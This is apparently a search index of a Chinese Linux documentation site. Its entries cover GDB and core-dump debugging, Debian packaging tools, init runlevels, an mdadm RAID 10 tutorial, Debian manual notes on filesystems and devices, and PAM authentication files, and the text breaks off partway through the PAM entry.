set write on 命令相同。 -s tatistics 在每次完成命令和回收到提示符的时候，此选项可让 GDB 打印时间和内存使用统计信息。 -v ersion 此选项可让 GDB 打印版本号和非保障性的声明然后退出 常用的command code: run                                           #运行\ninfo xxx                              #显示xxx信息\nbt                                            #显示堆栈\ncontinue                              #中断后继续运行到下一个断点\nstep                                  #单步执行，进入函数\nnext                                  #单步执行\nreturn                                        #函数未执行完，忽略未执行的语句，返回。\nfinish                                        #函数执行完毕返回。\ncall                                  #调用某一个函数 fun(\"1234\")\n(backtrace)bt                 #显示栈桢\nbt N                                  #显示开头N个栈桢\nbt -N                                 #显示最后N个栈桢\n(frame)f N                            #显示第N层栈桢\nlist                                  #显示源码\nset directory                 #设置gdb的工作目录\npwd                                           #当前的工作目录 关于gdb的core文件 Core Dump Core的意思是内存，Dump的意思是扔出来，堆出来。 开发和使用Unix程序时，有时程序莫名其妙的down了，却没有任何的提示(有时候会提示core dumped)，\n这时候可以查看一下有没有形如 core.进程号 的文件生成，\n这个文件便是操作系统把程序down掉时的内存内容扔出来生成的, 它可以做为调试程序的参考 生成Core文件 一般默认情况下，core file的大小被设置为了0，这样系统就不dump出core file了。修改后才能生成core文件: #设置core大小为无限\nulimit -c unlimited\n#设置文件大小为无限\nulimit unlimited 这些需要有root权限, 在ubuntu下每次重新打开中断都需要重新输入上面的第一条命令, 来设置core大小为无限 core文件生成路径 输入可执行文件运行命令的同一路径下。\n若系统生成的core文件不带其他任何扩展名称，则全部命名为core。新的core文件生成将覆盖原来的core文件。 /proc/sys/kernel/core_uses_pid可以控制core文件的文件名中是否添加pid作为扩展。\n文件内容为1，表示添加pid作为扩展名，生成的core文件格式为core.xxxx；为0则表示生成的core文件同一命名为core。 可通过以下命令修改此文件: echo \"1\" > /proc/sys/kernel/core_uses_pid proc/sys/kernel/core_pattern可以控制core文件保存位置和文件名格式。 可通过以下命令修改此文件: echo \"/corefile/core-%e-%p-%t\" > core_pattern 可以将core文件统一生成到/corefile目录下，产生的文件名为core-命令名-pid-时间戳 以下是参数列表: %p - insert pid into filename 添加pid\n%u - insert current uid into filename 添加当前uid\n%g - insert current gid into filename 添加当前gid\n%s - insert signal that caused the coredump into the filename 添加导致产生core的信号\n%t - insert UNIX time that the coredump occurred into filename 添加core文件生成时的unix时间\n%h - insert hostname where the coredump happened into filename 添加主机名\n%e - insert coredumping executable name into filename 添加命令名 用gdb查看core文件 发生core dump之后, 用gdb进行查看core文件的内容, 以定位文件中引发core dump的行: gdb [exec file] [core file] 如: gdb ./test core\n# 或gdb ./a.out\ncore-file core.xxxx gdb后, 用bt命令backtrace或where查看程序运行到哪里, 来定位core dump的文件->行. 待调试的可执行文件，在编译的时候需要加-g，core文件才能正常显示出错信息: gdb -core=core.xxxx\nfile ./a.out\nbt\n\ngdb -c core.xxxx\nfile ./a.out\nbt 用gdb实时观察某进程crash信息 启动进程: gdb -p PID\nc 运行进程至crash\ngdb会显示crash信息: bt 总结为两种情况 进程意外死亡或者崩溃，在对 core 的限制不为0的情况下可发生 core dump 生成 core 文件 如需对当时的情况进行排查，则需执行: gdb execfile corefile 跟踪已经存在的一个pid进行调试直至该pid崩溃 code: gdb -p pid Python使用gdb调试 启动有两种方式 1、交互式: $ gdb python\n...\n(gdb) run <programname>.py <arguments> 2、自动: $ gdb -ex r --args python <programname>.py <arguments> 调试: bt                            #查看c调用堆栈\npy-by                 #查看python调用栈\ninfo threads  #相关线程信息\npy-list                       #查看python代码运行到哪里\nthread apply all py-list\n        #查看所有进程的pyhton代码位置 python gdb extension在gdb的环境下提供了如下几个py命令: py-list        查看当前python应用程序上下文\npy-bt          查看当前python应用程序调用堆栈\npy-bt-full   查看当前python应用程序调用堆栈，并且显示每个frame的详细情况\npy-print     查看python变量\npy-locals   查看当前的scope的变量\npy-up         查看上一个frame\npy-down    查看下一个frame","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-GDB.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-GDB.html"},{"title":"debbuild","text":"deb完整构建可参考: 本地构建deb包 deb包需要的目录结构构建好后\n(可使用 debmake 来构建目录结构),\n通过此命令来构建完整的deb包. debbuild 读取软件包的源代码目录中的 debian/rules` 文件来执行构建过程，\n并自动处理构建过程中的许多步骤，例如配置、编译和安装. debuild 还会检查构建依赖关系并确保它们已满足，以及生成符合 Debian 软件包规范的二进制和源代码软件包. 相对而言 dpkg 更底层一点, 只需要编译好的代码与目录结构即可.","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-debbuild.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-debbuild.html"},{"title":"debmake","text":"需要构建 debian 的软件包(deb包)时,\n可通过此命令自动生成需要的deb目录结构. deb包构建可参考: 本地构建deb包 一般与 debbuild 一起使用, 如: $ tar -xzmf debhello-0.0.tar.gz\n$ cd debhello-0.0\n$ debmake\n  ... manual customization\n$ debuild\n  ...","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-debmake.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-debmake.html"},{"title":"init","text":"这涉及到 Linux系统的启动过程 支持的参数: 0 关机 1 单用户状态(root) 2 多用户状态(无NFS, 即不能使用net file system, 不联网) 3 多用户状态(有NFS, 标准的运行级) 4 保留, 未使用 5 进入GUI图形界面(X11、xwindow) 6 重启 init 进程是系统所有进程的起点，可以把它比拟成系统所有进程的老祖宗，没有这个进程，系统中任何进程都不会启动。\ninit 程序首先是需要读取配置文件 /etc/inittab(根据使用机制的不同读取不通的配置文件, 比如Ubuntu使用的是Upstart机制,\n相关配置文件为/etc/init/rc-sysinit.conf) 运行级别 许多程序需要开机启动。它们在Windows叫做\"服务\"（service），在Linux就叫做\"守护进程\"（daemon）。\ninit进程的一大任务，就是去运行这些开机启动的程序。\n但是，不同的场合需要启动不同的程序，比如用作服务器时，需要启动Apache，用作桌面就不需要。\nLinux允许为不同的场合，分配不同的开机启动程序，这就叫做\"运行级别\"（runlevel）。也就是说，启动时根据\"运行级别\"，确定要运行哪些程序。 查看当前运行级别可使用 runlevel Linux系统有7个运行级别(runlevel), 也就是init指令支持的参数： 运行级别0：系统停机状态，系统默认运行级别不能设为0，否则不能正常启动 运行级别1：单用户工作状态，root权限，用于系统维护，禁止远程登录 运行级别2：多用户状态(没有NFS) 运行级别3：完全的多用户状态(有NFS)，登录后进入控制台命令行模式 运行级别4：系统未使用，保留 运行级别5：X11控制台，登录后进入图形GUI模式 运行级别6：系统正常关闭并重启，默认运行级别不能设为6，否则不能正常启动 系统初始化 在init的配置文件中有这么一行: si::sysinit:/etc/rc.d/rc.sysinit 它调用执行了/etc/rc.d/rc.sysinit，而rc.sysinit是一个bash shell的脚本，\n它主要是完成一些系统初始化的工作，rc.sysinit是每一个运行级别都要首先运行的重要脚本。\n它主要完成的工作有: 激活交换分区 检查磁盘 加载硬件模块 一些需要优先执行任务。 如下面的内容: l5:5:wait:/etc/rc.d/rc 5 表示以5为参数运行/etc/rc.d/rc，/etc/rc.d/rc是一个Shell脚本，它接受5作为参数，\n去执行/etc/rc.d/rc5.d/目录下的所有的rc启动脚本，/etc/rc.d/rc5.d/目录中的这些启动脚本实际上都是一些连接文件，\n而不是真正的rc启动脚本，真正的rc启动脚本实际上都是放在/etc/rc.d/init.d/目录下。 而这些rc启动脚本有着类似的用法，它们一般能接受start、stop、restart、status等参数。\n/etc/rc.d/rc5.d/中的rc启动脚本通常是K或S开头的连接文件，对于以 S 开头的启动脚本，将以start参数来运行。\n而如果发现存在相应的脚本也存在K打头的连接，而且已经处于运行态了(以/var/lock/subsys/下的文件作为标志)，\n则将首先以stop为参数停止这些已经启动了的守护进程，然后再重新运行。 这样做是为了保证是当init改变运行级别时，所有相关的守护进程都将重启。\n至于在每个运行级中将运行哪些守护进程，用户可以通过chkconfig或setup中的\"System Services\"来自行设定。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-init.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-init.html"},{"title":"modprobe","text":"内核模块可见: 内核模块 -a , --all 载入全部的模块。 -c , --show-conf 显示所有模块的设置信息。 -d , --debug 使用排错模式。 -l , --list 显示可用的模块。 -r , --remove 若在命令指定模块,则删除指定模块,否则,指定\"自动清除\"模式 -t , --type 指定模块类型。 -v , --verbose 执行时显示详细的信息。 -V , --version 显示版本信息。 -h elp 显示帮助。 -C , --configconfig file 指定配置文件.默认使用/etc/modules.conf文件为配置文件 -c 列出目前系统所有的模组！(更详细的代号对应表) -l 列出目前在/lib/modules/ uname-r /kernel当中的所有模组完整档名； -f 强制载入该模组； -r 类似 rmmod ，就是移除某个模组啰～","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-modprobe.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-modprobe.html"},{"title":"pkexec","text":"linux桌面系统下申请提权指令, 是一个用于Linux的通用工具，\n它并不限于特定的桌面环境. 可在多个桌面系统中使用，包括但不限于: GNOME KDE Plasma Xfce LXQt Cinnamon MATE 用法: pkexec [--user username] <需要提权的指令/程序> [参数列表] 特别说明, pkexec执行脚本时, 虽然可能会一开始有 DISPLAY ,\n但是使用bash执行脚本时, 不会自动将 DISPLAY 这个环境变量给读进去,\n如: pkexec bash xxx.sh xxx.sh 脚本内获取的 DISPLAY 为空, 详见 DISPLAY","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-pkexec.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-pkexec.html"},{"title":"whoami","text":"查看正在使用的用户","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-whoami.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-whoami.html"},{"title":"设置 RAID 10 或 1 + 0 (嵌套)","text":"参考:: 作者: Babin Lonston 译者: LCTT 译者: struggling < https://linux.cn/portal.php?mod=comment&id=6122&idtype=aid >`_ RAID 10 是组合 RAID 1 和 RAID 0 形成的。\n要设置 RAID 10，我们至少需要4个磁盘。\n在之前的文章中，我们已经看到了如何使用最少两个磁盘设置 RAID 1 和 RAID 0。 在这里，我们将使用最少4个磁盘组合 RAID 1 和 RAID 0 来设置 RAID 10。\n假设我们已经在用 RAID 10 创建的逻辑卷保存了一些数据。\n比如我们要保存数据 \"TECMINT\"，它将使用以下方法将其保存在4个磁盘中。 在 Linux 中创建 Raid 10（LCTT 译注：原图有误，已修正） RAID 10 是先做镜像，再做条带。\n因此，在 RAID 1 中，相同的数据将被写入到两个磁盘中，\"T\"将同时被写入到第一和第二个磁盘中。\n接着的数据被条带化到另外两个磁盘，\"E\"将被同时写入到第三和第四个磁盘中。\n它将继续循环此过程，\"C\"将同时被写入到第一和第二个磁盘，以此类推。 注解 （LCTT 译注：原文中此处描述混淆有误，已经根据实际情况进行修改。） 现在你已经了解 RAID 10 怎样组合 RAID 1 和 RAID 0 来工作的了。\n如果我们有4个20 GB 的磁盘，总共为 80 GB，但我们将只能得到40 GB 的容量，另一半的容量在构建 RAID 10 中丢失。 RAID 10 的优点和缺点 提供更好的性能。 在 RAID 10 中我们将失去一半的磁盘容量。 读与写的性能都很好，因为它会同时进行写入和读取。 它能解决数据库的高 I/O 磁盘写操作。 要求 在 RAID 10 中，我们至少需要4个磁盘，前2个磁盘为 RAID 1，其他2个磁盘为 RAID 0，\n就像我之前说的，RAID 10 仅仅是组合了 RAID 0和1。\n如果我们需要扩展 RAID 组，最少需要添加4个磁盘。 服务器设置: 操作系统      :  CentOS 6.5 FinalIP\n地址          :   192.168.0.229\n主机名        :   rd10.tecmintlocal.com\n磁盘 1 [20GB]     :   /dev/sdd\n磁盘 2 [20GB]     :   /dev/sdc\n磁盘 3 [20GB]     :   /dev/sdd\n磁盘 4 [20GB]     :   /dev/sde 有两种方法来设置 RAID 10，在这里两种方法我都会演示，但我更喜欢第一种方法，使用它来设置 RAID 10 更简单。 方法1：设置 RAID 10 首先，使用以下命令确认所添加的4块磁盘没有被使用: ls -l /dev | grep sd 四个磁盘被检测后，然后来检查磁盘是否存在 RAID 分区: mdadm -E /dev/sd[b-e]### mdadm --examine /dev/sdb /dev/sdc /dev/sdd /dev/sde ### 或 验证添加的4块磁盘 注解 在上面的输出中，如果没有检测到 super-block 意味着在4块磁盘中没有定义过 RAID。 第1步：为 RAID 分区, 现在，使用 fdisk ，命令为4个磁盘(/dev/sdb, /dev/sdc, /dev/sdd 和 /dev/sde)创建新分区: fdisk /dev/sdb\nfdisk /dev/sdc\nfdisk /dev/sdd\nfdisk /dev/sde 为 /dev/sdb 创建分区,\n我来告诉你如何使用 fdisk 为磁盘(/dev/sdb)进行分区，此步也适用于其他磁盘: fdisk /dev/sdb 请使用以下步骤为 /dev/sdb 创建一个新的分区。 按 n 创建新的分区。 然后按 P 选择主分区。 接下来选择分区号为1。 只需按两次回车键选择默认值即可。 然后，按 P 来打印创建好的分区。 按 L ，列出所有可用的类型。 按 t 去修改分区。 键入 fd 设置为 Linux 的 RAID 类型，然后按 Enter 确认。 然后再次使用 p 查看我们所做的更改。 使用 w 保存更改。 为磁盘 sdb 分区 注解 请使用上面相同的指令对其他磁盘(sdc, sdd sdd sde)进行分区。 创建好4个分区后，需要使用下面的命令来检查磁盘是否存在 raid: mdadm -E /dev/sd[b-e]     # mdadm --examine /dev/sdb /dev/sdc /dev/sdd /dev/sde ### 或\nmdadm -E /dev/sd[b-e]1    # mdadm --examine /dev/sdb1 /dev/sdc1 /dev/sdd1 /dev/sde1 ### 或 检查磁盘 注解 以上输出显示，新创建的四个分区中没有检测到 super-block，\n这意味着我们可以继续在这些磁盘上创建 RAID 10。 第2步: 创建 RAID 设备 md 现在该创建一个`md`（即 /dev/md0）设备了，使用\"mdadm\" raid 管理工具。\n在创建设备之前，必须确保系统已经安装了`mdadm`工具，如果没有请使用下面的命令来安装: yum install mdadm     [在 RedHat 系统]### apt-get install mdadm     [在 Debain 系统] mdadm`工具安装完成后，可以使用下面的命令创建一个 `md raid 设备: mdadm --create /dev/md0 --level=10 --raid-devices=4 /dev/sd[b-e]1 接下来使用 cat 命令验证新创建的 raid 设备: cat /proc/mdstat 创建 md RAID 设备 接下来，使用下面的命令来检查4个磁盘。下面命令的输出会很长，因为它会显示4个磁盘的所有信息: mdadm --examine /dev/sd[b-e]1 接下来，使用以下命令来查看 RAID 阵列的详细信息: mdadm --detail /dev/md0 查看 RAID 阵列详细信息 注解 你在上面看到的结果，该 RAID 的状态是 active 和re-syncing。 第3步：创建文件系统 使用 ext4 作为 md0 的文件系统，并将它挂载到 /mnt/raid10 下。\n在这里，我用的是 ext4，你可以使用你想要的文件系统类型: mkfs.ext4 /dev/md0 创建 md 文件系统 在创建文件系统后，挂载文件系统到 /mnt/raid10 下，并使用 ls -l 命令列出挂载点下的内容: mkdir /mnt/raid10\nmount /dev/md0 /mnt/raid10/\nls -l /mnt/raid10/ 接下来，在挂载点下创建一些文件，并在文件中添加些内容，然后检查内容: touch /mnt/raid10/raid10_files.txt\nls -l /mnt/raid10/\necho \"raid 10 setup with 4 disks\" > /mnt/raid10/raid10_files.txt\ncat /mnt/raid10/raid10_files.txt 挂载 md 设备 要想自动挂载，打开`/etc/fstab`文件并添加下面的条目，挂载点根据你环境的不同来添加。使用 wq! 保存并退出: vim /etc/fstab/dev/md0\n/mnt/raid10              ext4    defaults        0 0 挂载 md 设备 接下来，在重新启动系统前使用`mount -a`来确认`/etc/fstab`文件是否有错误: mount -av 检查 Fstab 中的错误 第四步：保存 RAID 配置 默认情况下 RAID 没有配置文件，所以我们需要在上述步骤完成后手动保存它: mdadm --detail --scan --verbose >> /etc/mdadm.conf 保存 RAID10 的配置 就这样，我们使用方法1创建完了 RAID 10，这种方法是比较容易的。现在，让我们使用方法2来设置 RAID 10。 方法2：创建 RAID 10 在方法2中，我们必须定义2组 RAID 1，然后我们需要使用这些创建好的 RAID 1 的集合来定义一个 RAID 0。\n在这里，我们将要做的是先创建2个镜像（RAID1），然后创建 RAID0 （条带化）。 首先，列出所有的可用于创建 RAID 10 的磁盘: ls -l /dev | grep sd 列出了 4 个设备 将4个磁盘使用 fdisk 命令进行分区。对于如何分区，您可以按照上面的第1步: fdisk /dev/sdb### fdisk /dev/sdc### fdisk /dev/sdd### fdisk /dev/sde 在完成4个磁盘的分区后，现在检查磁盘是否存在 RAID块: mdadm --examine /dev/sd[b-e]\nmdadm --examine /dev/sd[b-e]1 检查 4 个磁盘 第1步：创建 RAID 1 首先，使用4块磁盘创建2组 RAID 1，一组为 sdb1 和 sdc1 ，另一组是 sdd1 和 sde1 mdadm --create /dev/md1 --metadata=1.2 --level=1 --raid-devices=2 /dev/sd[b-c]1\nmdadm --create /dev/md2 --metadata=1.2 --level=1 --raid-devices=2 /dev/sd[d-e]1\ncat /proc/mdstat 创建 RAID 1 查看 RAID 1 的详细信息 第2步：创建 RAID 0 接下来，使用 md1 和 md2 来创建 RAID 0: mdadm --create /dev/md0 --level=0 --raid-devices=2 /dev/md1 /dev/md2\ncat /proc/mdstat 创建 RAID 0 第3步：保存 RAID 配置 我们需要将配置文件保存在 /etc/mdadm.conf 文件中，使其每次重新启动后都能加载所有的 RAID 设备: mdadm --detail --scan --verbose >> /etc/mdadm.conf 在此之后，我们需要按照方法1中的第3步来创建文件系统。 就是这样！我们采用的方法2创建完了 RAID 1+0。我们将会失去一半的磁盘空间，但相比其他 RAID ，它的性能将是非常好的。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Tutorial-Raid-Set-Raid-10-or-1-+-0-(nested).html","loc":"/yq-docs-operating-system-linux-Tutorial-Raid-Set-Raid-10-or-1-+-0-(nested).html"},{"title":"类 Unix 文件系统","text":"在GNU/Linux和其他 类Unix 操作系统中， 文件 被组织到 目录 中。\n所有的文件和目录排放在以 \" / \" 为根的巨大的树里。\n叫它树是因为如果你画出文件系统，它看起来就像一棵树，但是它是颠倒过来的。 这些文件和目录可以分散在多个设备中。 mount 用于把某个设备上找到的文件系统附着到巨大的文件树上。\n相反的， umount 把它再次分离。\n在最近的 Linux 内核里， mount 带某些参数时可以把文件树的一部分绑定到另外的地方，\n或者可以把文件系统挂载为共享的、私有的、从设备、或不可绑定的。\n对每个文件系统支持的挂载选项可以在 /usr/share/doc/linux-doc-*/Documentation/filesystems/ 找到。 Unix系统上叫做 目录 ，\n某些其他系统上叫做 文件夹 。\n请同样留意，在任何Unix系统上，没有的 驱动器 的概念，\n例如 \" A: \" 。 这只有一个文件系统，并且所有东西都包含在内。\n这相对于 Windows 来说是一个巨大的优点。","tags":"操作系统","url":"/yq-docs-operating-system-linux-debian-DEBIAN-manual-Class-Unix-file-system.html","loc":"/yq-docs-operating-system-linux-debian-DEBIAN-manual-Class-Unix-file-system.html"},{"title":"设备文件","text":"设备文件 包括系统的物理设备和虚拟设备，如硬盘、显卡、显示屏、键盘。\n虚拟设备的一个例子是控制台，用\" /dev/console \"来描述。 设备文件有两种类型。 字符设备 每次访问一个字符 一个字符等于一个字节 如键盘、串口… 块设备 通过更大的单元–块，进行访问 一个块>一个字节 如硬盘等… 你可以读写块设备文件，尽管该文件可能包含二进制数据，\n读取后显示出无法理解的乱码。\n向文件写入数据，有时可以帮助定位硬件连接故障。\n比如，你可以将文本文件导入打印机设备\" /dev/lp0 \"，\n或者将调制解调命令发送到合适的串口\" /dev/ttyS0 \"。\n但是，除非这些操作都小心完成，否则可能会导致一场大灾难。所以要特别小心。 注解 常规访问打印机，使用 lp 设备的节点数可以通过执行 ls 得到，如下所示: $ ls -l /dev/sda /dev/sr0 /dev/ttyS0 /dev/zero\nbrw-rw---T  1 root disk     8,  0 Oct 16 20:57 /dev/sda\nbrw-rw---T+ 1 root cdrom   11,  0 Oct 16 21:53 /dev/sr0\ncrw-rw---T  1 root dialout  4, 64 Oct 16 20:57 /dev/ttyS0\ncrw-rw-rw-  1 root root     1,  5 Oct 16 20:57 /dev/zero /dev/sda 的主设备号是8，次设备号是0。它可以被 disk 群组的用户读写。 /dev/sr0 的主设备号是11，次设备号是0。它可以被 cdrom 群组的用户读写。 /dev/ttyS0 的主设备号是4，次设备号是64。它可以被 dailout 群组的用户读写。 /dev/zero 的主设备号是1，次设备号是5。它可以被任意用户读写。 在现代Linux系统中，处在 /dev 之下的文件系统会自动被 udev 机制填充。 特殊设备文件 还有一些特殊的设备文件。 特殊设备文件列表 设备文件 操作 响应描述 /dev/null 读取 返回 文件结尾字符（EOF） /dev/null 写入 无返回（一个无底的数据转存深渊） /dev/zero 读取 返回 0 空符（与ASCII中的数字0不同） /dev/random 读取 从真随机数产生器返回一个随机字符，供应真熵（缓慢） /dev/urandom 读取 从能够安全加密的伪随机数产生器返回一个随机字符 /dev/full 写入 返回磁盘已满（ENOSPC）错误 这些特别设备文件经常和 shell 数据重定向联合使用","tags":"操作系统","url":"/yq-docs-operating-system-linux-debian-DEBIAN-manual-Device-file.html","loc":"/yq-docs-operating-system-linux-debian-DEBIAN-manual-Device-file.html"},{"title":"procfs 和 sysfs","text":"procfs 和 sysfs 两个伪文件系统，\n分别加载于 /proc 和 /sys 之上，\n将内核中的数据结构暴露给用户空间。\n或者说，这些条目是虚拟的，他们打开了深入了解操作系统运行的方便之门。 目录 /proc 为每个正在运行的进程提供了一个子目录，\n目录的名字就是进程标识符（PID）。\n需要读取进程信息的系统工具，如 ps ，可以从这个目录结构获得信息。 /proc/sys 之下的目录，\n包含了可以更改某些内核运行参数的接口。\n（你也可以使用专门的 sysctl () 命令修改，或者使用其预加载/配置文件 /etc/sysctl.conf ） 当人们看到这个特别大的文件 /proc/kcore 时，常常会惊慌失措。\n这个文件于你的的电脑内存大小相差不多。\n它被用来调试内核。它是一个虚拟文件，指向系统内存，所以不必担心它的大小。 /sys 以下的目录包含了内核输出的数据结构，它们的属性，以及它们之间的链接。\n它同时也包含了改变某些内核运行时参数的接口。 参考: proc.txt(.gz)\nsysfs.txt(.gz)\n\n以及其他相关的Linux内核文档\n\n/usr/share/doc/linux-doc-*/Documentation/filesystems/*\n\n这些文件由 `linux-doc-*` 软件包提供。","tags":"操作系统","url":"/yq-docs-operating-system-linux-debian-DEBIAN-manual-ProCFS-and-Sysfs.html","loc":"/yq-docs-operating-system-linux-debian-DEBIAN-manual-ProCFS-and-Sysfs.html"},{"title":"特殊按键","text":"在 类Unix 环境，\n有一些具有特殊含义的按键。\n请注意，普通的Linux字符控制台，只有左手边的 Ctrl 和 Alt 键可以正常工作。其中有几个值得记住的按键。 bash 的按键绑定列表 快捷键 快捷键描述 Ctrl-U 删除光标前到行首的字符 Ctrl-H 删除光标前的一个字符 Ctrl-D 终止输入（如果你在使用 shell，则退出 shell） Ctrl-C 终止一个正在运行的程序 Ctrl-Z 通过将程序移动到后台来暂停程序 Ctrl-S 停止屏幕输出 Ctrl-Q 激活屏幕输出 Ctrl-Alt-Del 重启/关闭系统，参见 inittab 左 Alt 键 (可选择同时按下 Windows-key ) Emacs 和相似 UI 的元键（meta-key） Up-arrow 向上方向键 开始在 bash 中查看命令历史 Ctrl-R 开始在 bash 的增量命令历史中搜索 Tab 在 bash 命令行中补全文件名 跟 快捷键 基本一致","tags":"操作系统","url":"/yq-docs-operating-system-linux-debian-DEBIAN-manual-Special-buttons.html","loc":"/yq-docs-operating-system-linux-debian-DEBIAN-manual-Special-buttons.html"},{"title":"GNU/Linux 文件有三种类型的时间戳","text":"时间戳类型列表 类型 含义（历史上 Unix 的定义） mtime 文件修改时间( ls -1 ) ctime 文件状态修改时间 ( ls -lc ) atime 文件最后被访问的时间 ( ls -lu ) 注意 ctime 不是文件创建时间。 注意 atime 在 GNU/Linux 系统上的真实值可能和历史上 Unix 的定义有所不同。 覆盖 一个文件，将会改变该文件所有的 mtime , ctime , 和 atime 属性。 改变文件的 所有者或者权限 ，将改变文件的 ctime 和 atime 属性。 在历史上的 Unix 系统中，读取一个文件将改变文件的 atime 属性。 读一个文件，将改变文件的 atime 属性；\n在 GNU/Linux 系统上，这仅发生在其文件系统使用\" strictatime \"参数挂载的情况下。 如果 GNU/Linux 系统的文件系统使用 \" relatime \" 选项挂载，\n第一次读文件，或者随后读文件，将改变该文件的 atime 属性. (从 Linux 2.6.30 开始的默认行为) 如果 GNU/Linux 系统的文件系统使用 \" noatime \" 挂载，则读一个文件，不会改变这个文件的 atime 属性。 注解 为了在正常的使用场景中能够提升文件系统的读取效率，\n新增了 \" noatime \" 和 \" relatime \" 这两个加载选项。\n如使用了 \" strictatime \" 选项，\n即使简单的文件读操作都伴随着更新 atime 属性这个耗时的写操作。\n但是 atime 属性除了 mbox 文件以外却很少用到。\n详情请看 mount 。\n使用 touch 命令修改已存在文件的时间戳。","tags":"操作系统","url":"/yq-docs-operating-system-linux-debian-DEBIAN-manual-Three-types-of-time-stamps.html","loc":"/yq-docs-operating-system-linux-debian-DEBIAN-manual-Three-types-of-time-stamps.html"},{"title":"debian10 iptables-restore 的 bug","text":"系统是在官网下载的包安装的虚拟机 再一次业务对接过程中意外发现业务连不上这台机器， 经过排除大法，\n终于发现此 debian10 机器的 iptables-restore 模块存在问题 在 debian9 的系统上测试无此问题。\n在网上也没有找到相关的记录 本来想提交给 debian 官网，奈何没有找到入口，遂在此记录。 当使用 iptables-restore 恢复防火墙时，会清除 -D 规则之前的所有防火墙条目 问题图，-D前的规则被删除 系统配置图 在社区以及官网找了很久都没有找到相关说明 先记录一下","tags":"操作系统","url":"/yq-docs-operating-system-linux-question-Debian10-iptables-restore-bug.html","loc":"/yq-docs-operating-system-linux-question-Debian10-iptables-restore-bug.html"},{"title":"定时任务","text":"使用 crond 来进行定时任务安排。参见 crontab 和 crontab 你能够作为一个普通用户定时运行一个进程，比如， foo 使用 crontab -e 命令创建一个 crontab 文件 /var/spool/cron/crontabs/foo","tags":"操作系统","url":"/yq-docs-operating-system-linux-question-Timing-task.html","loc":"/yq-docs-operating-system-linux-question-Timing-task.html"},{"title":"警告所有人","text":"你可以通过下面的方式使用 wall 给登录系统的每一个人发送信息: $ echo \"We are shutting down in 1 hour\" | wall","tags":"操作系统","url":"/yq-docs-operating-system-linux-question-Warning-everyone.html","loc":"/yq-docs-operating-system-linux-question-Warning-everyone.html"},{"title":"认证和访问控制","text":"一般的 Unix 认证 一般的 Unix 认证由 PAM(Pluggable Authentication Modules,即可插入的验证模块) 下的 pam_unix 模块提供。\n它的 3 个重要文件如下，其内的条目使用 \" : \" 分隔: 文件                    权限              用户              组               说明\n/etc/passwd   -rw-r--r--      root    root    （明文的）用户账号信息\n/etc/shadow   -rw-r-----      root    shadow  安全加密的用户账号信息\n/etc/group    -rw-r--r--      root    root    组信息 /etc/passwd` /etc/passwd 包含下列内容: user1:x:1000:1000:User1 Name,,,:/home/user1:/bin/bash user2:x:1001:1001:User2 Name,,,:/home/user2:/bin/bash 如 passwd 中所述，这个文件中被 \" : \" 分隔的每项含义如下。 登录名 密码形式说明 数字形式的用户 ID 数字形式的组 ID 用户名或注释字段 用户家目录 可选的用户命令解释器 /etc/passwd 的第二项曾经被用来保存加密后的密码。在引入了 \" /etc/shadow \" 后，该项被用来说明密码形式。 /etc/shadow /etc/shadow 包含下列内容: user1:$1$Xop0FYH9$IfxyQwBe9b8tiyIkt2P4F/:13262:0:99999:7:::\nuser2:$1$vXGZLVbS$ElyErNf/agUDsm1DehJMS/:13261:0:99999:7::: 如 shadow (5) 中所述，这个文件中被 \" : \" 分隔的每项含义如下。 登录名 加密后的密码（开头的 \" $1$ \" 表示使用 MD5 加密。\"*\" 表示无法登陆。） 最后一次修改密码的时间，其表示从 1970 年 1 月 1 日起的天数 允许用户再次修改密码的天数间隔 用户必须修改密码的天数间隔密码失效前的天数，在此期间用户会被警告 密码失效后的天数，在次期间密码依旧会被接受账号失效的时间，其表示从 1970 年 1 月 1 日起的天数 … /etc/group /etc/group 包含下列内容: group1:x:20:user1,user2 如 group (5) 中所述，这个文件中被 \" : \" 分隔的每项含义如下。 组名称 加密后的密码（不会被真正使用） 数字形式的组 ID 使用 \",\" 分隔的用户名列表 注解 \" /etc/gshadow \" 为 \" /etc/group \" 提供了与 \" /etc/shadow \" 相似的功能，但没有被真正地使用。 如果\" auth optional pam_group.so \" 这行添加到了\" /etc/pam.d/common-auth \"，\n并且在\" /etc/security/group.conf \" 里进行了设置，一个用户的实际组就可以被动态添加。参见 pam_group (8). base-passwd 软件包包含了一份用户和组的官方文档：\" /usr/share/doc/base-passwd/users-and-groups.html \"。 设立加密的密码 下面是一些用于 生成加盐的加密密码 的独立工具 生成密码的工具: 软件包   流行度                             大小              命令                              功能\nwhois V:32, I:371             364             mkpasswd                具备 crypt(3) 库所有特性的前端\nopenssl       V:814, I:994    1465    openssl passwd  计算密码哈希 (OpenSSL). passwd(1ssl) PAM 和 NSS 可参考: PAM模块 现代的 类 Unix 系统（例如 Debian 系统）提供 PAM(Pluggable Authentication Modules,即可插入的验证模块) 和 NSS（Name Service Switch，名称服务切换） 机制给本地系统管理员，使他们能够配置自己的系统。它们的功能可以概括为以下几点。 PAM 给应用软件提供了一个灵活的认证机制，因此涉及到了密码数据的交换。 NSS 提供了一个灵活的名称服务机制，\n它经常被 C 标准库 使用，\n使例如 ls (1) 和 id (1) 这样的程序获得用户和组名称。 PAM 和 NSS 系统必须保持配置一致。 PAM 和 NSS 系统中重要的软件包如下: 软件包                           流行度                             大小              说明\nlibpam-modules                V:813, I:999    1048    插入式验证模块（基础服务）\nlibpam-ldap                   I:12                    249             允许 LDAP 接口的插入式验证模块\nlibpam-cracklib               I:15                    117             启用 cracklib 支持的插入式验证模块\nlibpam-systemd                V:484, I:869    574             用于 logind 注册用户会话的插入式验证模块（PAM）\nlibpam-doc                    I:1                             1046    插入式验证模块（html 和 文本文档）\nlibc6                         V:946, I:999    12772   GNU C 库：同样提供\"名称服务切换\"服务的共享库\nglibc-doc                     I:11       